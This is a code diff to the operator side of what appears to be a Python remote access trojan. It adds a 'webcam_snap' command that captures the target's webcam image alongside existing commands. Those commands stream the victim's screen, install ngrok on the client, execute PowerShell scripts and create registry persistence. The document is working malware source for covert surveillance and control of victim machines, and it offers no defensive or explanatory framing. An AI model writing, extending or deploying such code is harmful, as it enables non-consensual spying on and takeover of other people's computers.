@@ -5,6 +5,7 @@ import os
 import threading
 from os.path import *
 
+
 f = open('serverport.txt', 'r').read()
 if f == "{}" or "":
     serverport = input('entre serverport:')
@@ -26,6 +27,10 @@ def replace_string(filename, old_string, new_string):
     with open(filename, 'w') as f:
         s = s.replace(old_string, new_string)
         f.write(s)
+
+
+
+
 
 
 def build():
@@ -251,11 +256,22 @@ def target_communication(target, ip):
                     screenshare                        --> stream client screen
                     ssharescreen                       --> stopstreaming
                     ngroksetup                         --> download ngrok on the client
+                    webcam_snap                        --> open target webcam and get Pic
                     changepolicy                       --> execute powershell scripts
                     cwallpaper                         --> change wallpaper
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
+            elif command[:11] == "webcam_snap":
+                print('[*] Openning Webcam')
+                try:
+                    download_file(target,'webcam.jpg')
+                except:
+                    print("[-] Error Getting image")
+                else:
+                    print("[+] Image Captured")
+                    os.system('start webcam.jpg')
+
             elif command[:10] == 'cwallpaper':
                 if isfile(command[11:]) == True:
                     upload_file(target, command[11:])
